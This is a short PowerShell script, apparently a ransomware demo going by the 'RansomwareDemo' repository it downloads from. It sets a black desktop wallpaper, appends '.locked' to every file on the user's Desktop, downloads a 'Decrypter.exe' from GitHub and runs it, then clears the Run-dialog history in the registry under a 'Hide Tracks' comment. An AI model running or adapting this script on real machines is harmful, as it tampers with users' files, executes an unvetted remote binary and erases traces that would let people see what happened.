# Changes Background  
$url = "https://www.solidbackgrounds.com/images/3840x2160/3840x2160-black-solid-color-background.jpg"


Invoke-WebRequest $url -OutFile C:\Windows\Temp\black.jpg 


$setwallpapersrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path)
  {
    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
}
"@
Add-Type -TypeDefinition $setwallpapersrc

[Wallpaper]::SetWallpaper("C:\Windows\Temp\black.jpg")

# Rename Files
Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}

# Download and execute Decrypter
$url = "https://github.com/V4T3X/RansomwareDemo/blob/558287d2cfcc4fe7cba190d297dfa1f70c111c52/Decrypter.exe"

$desktopPath = [System.Environment]::GetFolderPath('Desktop')

$targetPath = Join-Path -Path $desktopPath -ChildPath "Decrypter.exe"

Invoke-WebRequest -Uri $url -OutFile $targetPath

Start-Process -FilePath $targetPath

# Hide Tracks
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
